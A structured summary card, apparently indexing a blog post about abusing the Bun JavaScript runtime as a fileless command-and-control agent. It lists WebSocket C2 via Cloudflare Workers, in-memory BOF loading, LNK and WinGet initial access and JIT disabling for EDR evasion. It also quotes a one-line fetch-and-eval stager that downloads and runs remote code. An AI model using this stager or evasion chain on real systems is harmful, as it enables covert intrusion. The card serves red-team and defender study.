Title:
BYOI: Trusted Host — Abusing Bun (JavaScript runtime) as a fileless C2 agent

Type:
Blog Post

Short Summary (4-8 sentences max):
This post demonstrates a “Bring Your Own Interpreter” approach using the signed Bun JavaScript runtime as a trusted host process to execute a fileless C2 agent. It shows a minimal fetch+eval stager (`bun -e 'eval(await(await fetch(...)).text())'`) and an operationalized C2 (“Bunksy”) that communicates over encrypted WebSockets via Cloudflare Workers/Durable Objects. Post-execution is modular: TypeScript/JavaScript modules are delivered remotely and executed in isolated Bun Workers, with output captured by hooking `console.*`. The author adds an in-memory BOF/COFF loader (ported from TrustedSec COFFLoader) using Bun FFI/WinAPI bindings to run existing Beacon Object Files, and experiments with running Go-compiled WebAssembly (including a SOCKS proxy) inside Bun. It also covers an initial access chain using LNK + WinGet to install Bun and execute the stager, plus an option to disable JIT (`BUN_JSC_useJIT=0`) to reduce RX/JIT artifacts. Useful primarily for red teams/pentesters building low-friction post-ex tooling and for defenders studying interpreter/VM-based execution tradecraft.

Technical Focus:
- Bring Your Own Interpreter (BYOI) / trusted host execution (Bun)
- Fileless staging via fetch+eval and REPL execution (`bun -e/--eval`)
- WebSocket C2 over Cloudflare Workers + Durable Objects (encrypted transport)
- Bun Workers for isolated module execution and memory cleanup
- BOF/COFF in-memory loading with Beacon API support via Bun FFI/WinAPI
- WebAssembly (Go->WASM) execution with custom host shims (networking)

Use Cases:
- Deploying a lightweight, modular JS/TS agent inside a signed, legitimate runtime
- EDR evasion research around interpreter/JIT-normalized RX memory behavior
- Executing existing BOF collections from a non-traditional (JS) agent process
- Rapid “disposable tooling” C2/module development and per-task obfuscation
- Experimenting with WASM-based post-ex payloads (e.g., SOCKS proxy) in-memory

Keywords:
BYOI, Bun, JavaScriptCore, Node-API, fetch eval stager, fileless execution, LNK, WinGet, WebSockets, Cloudflare Workers, Durable Objects, C2, Bun Workers, JIT disable, BUN_JSC_useJIT, TypeScript modules, JavaScript obfuscation, BOF, COFF, Beacon API, Bun FFI, WinAPI, WebAssembly, Go WASM, wasm_exec.js, SOCKS proxy, ProxyBlob